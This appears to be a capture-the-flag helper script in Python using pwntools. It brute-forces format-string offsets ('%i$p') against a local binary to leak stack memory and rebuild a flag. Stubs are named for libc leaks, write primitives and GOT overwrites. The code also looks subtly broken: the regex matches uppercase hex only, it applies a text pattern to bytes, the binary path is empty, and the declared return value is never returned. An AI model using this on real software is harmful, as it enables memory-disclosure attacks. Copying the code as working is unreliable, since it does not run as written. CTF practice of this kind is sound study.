from typing import Optional
import re
from pwn import process

def stack_leak(vuln) -> Optional[str]:
    bin_path = ""
    start_pay = ""
    POINTER_RE = r"""0x([0-9A-F]+)"""

    found_flag = False
    flag = ""
    for i in range(1000):
        p = process(bin_path)
        p.send(start_pay + f"%{i}$p")
        out = p.recv()
        comp = re.compile(POINTER_RE)
        srch = comp.search(out)
        if srch:
            text = bytes.fromhex(srch.group(1)).decode("ascii")[::-1]
            if "flag" in text:
                found_flag = True
            if found_flag:
                flag += text
            if "}" in text:
                break
    
    if found_flag:
        print(f"Flag found! {flag}")
    else:
        print("Could not find flag from leaking stack!")

def libc_leak(vuln) -> Optional[str]:
    return None # TODO

def write_prim(vuln) -> Optional[str]:
    return None # TODO

def got_overwrite(vuln) -> Optional[str]:
    return None # TODO